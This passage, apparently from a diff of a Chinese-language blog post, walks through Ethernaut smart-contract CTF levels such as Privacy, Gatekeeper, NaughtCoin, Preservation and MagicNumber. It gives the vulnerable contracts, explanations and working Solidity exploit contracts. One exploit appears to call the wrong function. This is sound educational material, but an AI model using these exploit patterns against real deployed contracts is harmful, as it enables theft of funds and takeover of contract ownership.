withdraw<br>      reentrance.withdraw(1000000000000000);<br>   &#125;<br>   receive() external payable &#123; <br>      reentrance.withdraw(1000000000000000);<br>      emit Log(address(this).balance);<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="elevator"><a href="#elevator" class="headerlink" title="elevator"></a>elevator</h2><blockquote>
+<p>This elevator won’t let you reach the top of your building. Right?</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>interface Building &#123;<br>  function isLastFloor(uint) external returns (bool);<br>&#125;<br><br><br>contract Elevator &#123;<br>  bool public top;<br>  uint public floor;<br><br>  function goTo(uint _floor) public &#123;<br>    Building building = Building(msg.sender);<br><br>    if (! building.isLastFloor(_floor)) &#123;<br>      floor = _floor;<br>      top = building.isLastFloor(floor);<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312051628226.png" srcset="/img/loading.gif" lazyload alt="image-20231205151716971"></p>
+<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><blockquote>
+<p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p>
+<p>Unlock this contract to beat the level.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Privacy &#123;<br><br>  bool public locked = true;<br>  uint256 public ID = block.timestamp;<br>  uint8 private flattening = 10;<br>  uint8 private denomination = 255;<br>  uint16 private awkwardness = uint16(block.timestamp);<br>  bytes32[3] private data;<br><br>  constructor(bytes32[3] memory _data) &#123;<br>    data = _data;<br>  &#125;<br>  <br>  function unlock(bytes16 _key) public &#123;<br>    require(_key == bytes16(data[2]));<br>    locked = false;<br>  &#125;<br><br>  /*<br>    A bunch of super advanced solidity algorithms...<br><br>      ,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`<br>      .,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,<br>      *.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^         ,---/V\<br>      `*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.    ~|__(o.o)<br>      ^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;^`*.,*&#x27;  UU  UU<br>  */<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>bool public locked 为 1 byte 在slot0</p>
+<p>uint256 public ID 为 32 byte，slot0已经有一个1byte的数据了，放不下，所以占据整个slot1</p>
+<p>flattening，denomination，awkwardness分别为8byte，8byte，16byte，在slot2</p>
+<p>data数组中的每一个元素为32byte，占据一个slot</p>
+<p>因此bytes32[2]在slot5</p>
+<p>await web3.eth.getStorageAt(instance, 5) </p>
+<p>得到</p>
+<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xb18abbe89d96b147d06131b87441f19870cf369348e21e55cc330243df3dc5fd</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">require(_key == bytes16(data[2]));<br></code></pre></td></tr></table></figure>
+
+<p>那么取前16byte即可</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>xb18abbe89d96b147d06<span class="hljs-number">131b87441f198</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312051628903.png" srcset="/img/loading.gif" lazyload alt="image-20231205161943216"></p>
+<h2 id="Gatekepper"><a href="#Gatekepper" class="headerlink" title="Gatekepper"></a>Gatekepper</h2><blockquote>
+<p>Make it past the gatekeeper and register as an entrant to pass this level.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract GatekeeperOne &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    require(gasleft() % 8191 == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);<br>      require(uint32(uint64(_gateKey)) != uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);<br>      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br><br></code></pre></td></tr></table></figure>
+
+
+
+<p><code>gateOwn</code>  只需要通过一个攻击合约去调GatekeeperOne的enter，此时tx.origin是攻击者，msg.sender是攻击合约</p>
+<p><code>gateTwo</code> 可以通过爆破来找到一个i，使得消耗i gas后剩余的gas为8191*n</p>
+<p><code>gateThree</code> 需要满足以下三个条件：</p>
+<p>假设 gatekey 为 0xb1b2b3b4b5b6b7b8</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))<br></code></pre></td></tr></table></figure>
+
+<p>意味着 0xb5b6b7b8 &#x3D;&#x3D; 0x0000b7b8 也就是b5和b6均为0x00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint32(uint64(_gateKey)) != uint64(_gateKey)<br></code></pre></td></tr></table></figure>
+
+<p>意味着b1 b2 b3 b4 不全为0x00</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))<br></code></pre></td></tr></table></figure>
+
+<p>意味着gatekey的低两位即b1b2为tx.origin的低两位</p>
+<p>以上</p>
+<p>那么只需要将tx.origin与上<code>0xFFFFFFFF0000FFFF</code> 即可</p>
+<p>最终Exp:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>  function exploit() public&#123;<br>    bytes8 _key = bytes8(uint64(uint160(tx.origin))) &amp; 0xFFFFFFFF0000FFFF;<br>    for(uint256 i = 1; i &lt; 300 ; i++)&#123;<br>      (bool success, ) = address(0x8dd6eD2f7198a199ee0690d2fDC04845c4D1840A).call&#123;gas: 8191*3+i&#125;(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _key));<br>      if(success)&#123;<br>        break;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Gatekepper-Two"><a href="#Gatekepper-Two" class="headerlink" title="Gatekepper Two"></a>Gatekepper Two</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract GatekeeperTwo &#123;<br><br>  address public entrant;<br><br>  modifier gateOne() &#123;<br>    require(msg.sender != tx.origin);<br>    _;<br>  &#125;<br><br>  modifier gateTwo() &#123;<br>    uint x;<br>    assembly &#123; x := extcodesize(caller()) &#125;<br>    require(x == 0);<br>    _;<br>  &#125;<br><br>  modifier gateThree(bytes8 _gateKey) &#123;<br>    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);<br>    _;<br>  &#125;<br><br>  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;<br>    entrant = tx.origin;<br>    return true;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>gateOne</code> 通过调攻击合约调目标合约的enter即可</p>
+<p><code>gateTwo</code> 这里用到了 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">assembly &#123; x := extcodesize(caller()) &#125;<br></code></pre></td></tr></table></figure>
+
+<p>assembly用来调EVM的代码 这个的意思是获取调用者代码的长度存入x变量中</p>
+<p>如果调用者不是合约而是账户的话代码长度默认为0，但这样就过不了前面的<code>msg.sender != tx.origin</code> 了</p>
+<p>智能合约在编译时会分为两种不同的字节码：</p>
+<p><code>creation bytecode</code> 和 <code>runtime bytecode</code></p>
+<p><strong>creation bytecode</strong> 是 以太坊创建合约并仅执行一次构造函数所需的字节码</p>
+<p><strong>runtime bytecode</strong> 是合约的真实代码，存储在区块链中，将用于执行智能合约功能</p>
+<p>当执行构造函数初始化合约存储时，<code>address(contract).code.length</code>返回<code>runtime bytecode</code> ，也就是说可以把攻击代码写在构造函数里，此时code的length为0</p>
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    event Log(bool success);<br>    constructor() &#123;<br>        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);<br>        (bool success, ) = address(0x13B67a02e2073700a274518f31Ba9d254dCeB366).call(abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey));<br>        emit Log(success);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="Naughty-Coin"><a href="#Naughty-Coin" class="headerlink" title="Naughty Coin"></a>Naughty Coin</h2><blockquote>
+<p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year  lockout period. Can you figure out how to get them out to another  address so that you can transfer them freely? Complete this level by  getting your token balance to 0.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &#x27;openzeppelin-contracts-08/token/ERC20/ERC20.sol&#x27;;<br><br> contract NaughtCoin is ERC20 &#123;<br><br>  // string public constant name = &#x27;NaughtCoin&#x27;;<br>  // string public constant symbol = &#x27;0x0&#x27;;<br>  // uint public constant decimals = 18;<br>  uint public timeLock = block.timestamp + 10 * 365 days;<br>  uint256 public INITIAL_SUPPLY;<br>  address public player;<br><br>  constructor(address _player) <br>  ERC20(&#x27;NaughtCoin&#x27;, &#x27;0x0&#x27;) &#123;<br>    player = _player;<br>    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));<br>    // _totalSupply = INITIAL_SUPPLY;<br>    // _balances[player] = INITIAL_SUPPLY;<br>    _mint(player, INITIAL_SUPPLY);<br>    emit Transfer(address(0), player, INITIAL_SUPPLY);<br>  &#125;<br>  <br>  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) &#123;<br>    super.transfer(_to, _value);<br>  &#125;<br><br>  // Prevent the initial owner from transferring tokens until the timelock has passed<br>  modifier lockTokens() &#123;<br>    if (msg.sender == player) &#123;<br>      require(block.timestamp &gt; timeLock);<br>      _;<br>    &#125; else &#123;<br>     _;<br>    &#125;<br>  &#125; <br>&#125; <br></code></pre></td></tr></table></figure>
+
+<p>实现了ERC20代币，重写了ERC20的<code>transfer</code> 方法，但没有重写其<code>transferFrom</code> 方法，</p>
+<p><code>transferFrom</code> 可以转账授权的代币</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol</a></p>
+<p>Exploit:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>import &#123;IERC20&#125; from &#x27;@openzeppelin/contracts/interfaces/IERC20.sol&#x27;;<br><br>contract Exploit &#123;<br>    IERC20 naughtCoin = IERC20(0xaee1346F965C80D5DD92dbF340d58a6Ec777775C);<br>    function exploit(uint value) public &#123;<br>        naughtCoin.transferFrom(0xAE180bcc68A4A32203210DFe4fD40a11Ad5e5d27, address(this), value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>部署Exploit合约，得到地址0x4CC31dbd7fF1E215C69286419108C3C2Ac71CF14</p>
+<p>那么先approve这个地址1000000000000000000000000 wei</p>
+<p>再调Exploit的exploit方法把1000000000000000000000000 wei转走即可</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221326816.png" srcset="/img/loading.gif" lazyload alt="image-20231212181427942"></p>
+<h2 id="Preservation"><a href="#Preservation" class="headerlink" title="Preservation"></a>Preservation</h2><blockquote>
+<p>This contract utilizes a library to store two different times for two different timezones. The constructor creates two instances of the library for each time to be stored.</p>
+<p>The goal of this level is for you to claim ownership of the instance you are given.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br> <br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(abi.encodePacked(setTimeSignature, _timeStamp));<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>这里用到了delegatecall</p>
+<p>A合约通过delegatecall调B合约的方法，修改的状态变量会是作用在A上的</p>
+<p>这边<code>Preservation</code> 通过 delegatecall 调了 LibraryContract的setTime，并修改了storedTime，由于storedTime占slot0，因此实际上是修改了<code>Preservation</code> slot0上的内容，也即timeZone1Library</p>
+<p>那么我们第一步修改slot0，把timeZone1Library的地址修改成我们部署的攻击合约地址，第二步通过delegatecall调攻击合约的setTime方法修改slot3上的内容，也即owner的地址，即可完成owner的修改</p>
+<p>Exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs solidity">contract Exploit &#123;<br>    address public timeZone1Library;<br>    address public timeZone2Library;<br>    address public owner; <br>    Preservation preservation = Preservation(0x9bdA9ef79108556dF26e27B859e464f0baCFdE66);<br>    function exploit() public&#123;<br>        // change timZone1Library address to this<br>        preservation.setFirstTime(uint160(address(this))); <br>        // changeOwner<br>        preservation.setFirstTime(uint160(address(this))); <br><br>    &#125;<br>    function setTime(uint _time) public&#123;<br>        owner = 0xAE180bcc68A4A32203210DFe4fD40a11Ad5e5d27;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325890.png" srcset="/img/loading.gif" lazyload alt="image-20231213112147871"></p>
+<h2 id="Recovery"><a href="#Recovery" class="headerlink" title="Recovery"></a>Recovery</h2><blockquote>
+<p>A contract creator has built a very simple token factory contract.  Anyone can create new tokens with ease. After deploying the first token  contract, the creator sent <code>0.001</code> ether to obtain more tokens. They have since lost the contract address.</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract Recovery &#123;<br><br>  //generate tokens<br>  function generateToken(string memory _name, uint256 _initialSupply) public &#123;<br>    new SimpleToken(_name, msg.sender, _initialSupply);<br>  <br>  &#125;<br>&#125;<br><br>contract SimpleToken &#123;<br><br>  string public name;<br>  mapping (address =&gt; uint) public balances;<br><br>  // constructor<br>  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;<br>    name = _name;<br>    balances[_creator] = _initialSupply;<br>  &#125;<br><br>  // collect ether in return for tokens<br>  receive() external payable &#123;<br>    balances[msg.sender] = msg.value * 10;<br>  &#125;<br><br>  // allow transfers of tokens<br>  function transfer(address _to, uint _amount) public &#123; <br>    require(balances[msg.sender] &gt;= _amount);<br>    balances[msg.sender] = balances[msg.sender] - _amount;<br>    balances[_to] = _amount;<br>  &#125;<br><br>  // clean up after ourselves<br>  function destroy(address payable _to) public &#123;<br>    selfdestruct(_to);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>去etherscan上查一查就行了</p>
+<p><img src="/assets/image-20231213114812287.png" srcset="/img/loading.gif" lazyload alt="image-20231213114812287"></p>
+<p>得到了创建合约的地址直接调destroy把钱转走就行了</p>
+<p><img src="https://xux-1301156201.cos.ap-beijing.myqcloud.com/imgs/202312221325982.png" srcset="/img/loading.gif" lazyload alt="image-20231213115623458"></p>
+<p>也可以通过计算合约的生成地址</p>
+<p>以太坊合约的地址是根据创建者（sender）的地址以及创建者发送过的交易数量（nonce）来计算确定的。 <code>sender</code>和<code>nonce</code> 进行<a target="_blank" rel="noopener" href="https://learnblockchain.cn/2019/05/20/geth-rlp-encode/">RLP编码</a>，然后用<code>Keccak-256</code> 进行hash计算。</p>
+<p>如果sender为工厂合约，nonce就是该帐户创建的合约数量</p>
+<p>因此可以通过这个公式计算合约地址：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs solidity">address public a = address(keccak256(0xd6, 0x94, YOUR_ADDR, 0x01));<br></code></pre></td></tr></table></figure>
+
+<h2 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h2><blockquote>
+<p>To solve this level, you only need to provide the Ethernaut with a <code>Solver</code>, a contract that responds to <code>whatIsTheMeaningOfLife()</code> with the right number.</p>
+<p>Easy right? Well… there’s a catch.</p>
+<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny.  Like freakin’ really really itty-bitty tiny: 10 opcodes at most.</p>
+<p>Hint: Perhaps its time to leave the comfort of the Solidity compiler momentarily, and build this one by hand O_o. That’s right: Raw EVM bytecode.</p>
+<p>Good luck!</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: MIT<br>pragma solidity ^0.8.0;<br><br>contract MagicNum &#123;<br><br>  address public solver;<br><br>  constructor() &#123;&#125;<br><br>  function setSolver(address _solver) public &#123;<br>    solver = _solver;<br>  &#125;<br><br>  /*<br>    ____________/\\\_______/\\\\\\\\\_____        <br>     __________/\\\\\_____/\\\///////\\\___       <br>      ________/\\\/\\\____\///______\//\\\__      <br>       ______/\\\/\/\\\______________/\\\/___     <br>        ____/\\\/__\/\\\___________/\\\//_____    <br>         __/\\\\\\\\\\\\\\\\_____/\\\//________   <br>          _\///////////\\\//____/\\\/___________  <br>           ___________\/\\\_____/\\\\\\\\\\\\\\\_ <br>            ___________\///_____\///////////////__<br>  */<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>我们需要编写两组字节码，分别为Runtime bytecode(运行时字节码) 和 Initialization byte code(初始化字节码)</p>
+<p>首先编写Runtime opcodes，直接返回宇宙的答案42就行了</p>
+<p>首先使用MSTORE(p, v)，其中 p 是位置或偏移量，v 是值。将42(0x2a) 存入0x80的slot位置处</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x2a  --&gt;  <span class="hljs-number">0</span>x602a<br><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x80  --&gt;  <span class="hljs-number">0</span>x6080<br><span class="hljs-attribute">MSTORE</span>  --&gt;  <span class="hljs-number">0</span>x52 (Store value p=<span class="hljs-number">0</span>x2a at position v=<span class="hljs-number">0</span>x80 in memory)<br></code></pre></td></tr></table></figure>
+
+<p>然后返回存储的值</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x20  --&gt;  <span class="hljs-number">0</span>x6020<br><span class="hljs-attribute">PUSH1</span> <span class="hljs-number">0</span>x80  --&gt;  <span class="hljs-number">0</span>x6080<br><span class="hljs-attribute">RETURN</span>  --&gt;  <span class="hljs-number">0</span>xf3 (Return value at p=<span class="hljs-number">0</span>x80 slot and of size s=<span class="hljs-number">0</span>x20)<br></code></pre></td></tr></table></figure>
+
+<p>以上就得到了Runtime bytecodes</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">0</span>x602a60805<span class="hljs-number">260206080f3</span><br></code></pre></td></tr></table></figure>
+
+<p>然后编写初始化字节码</p>
+<p>首先使用CODECOPY(t, f, s) 复制代码</p>
+<p>t 为代码在内存中的目标偏移量。我们将其保存到 0x00 偏移量</p>
+<p>f 是运行时操作码的当前位置，目前尚不清楚</p>
+<p>s 是运行时代码的大小，即<code>0x602a60805260206080f3</code> 的大小，为10bytes</p>
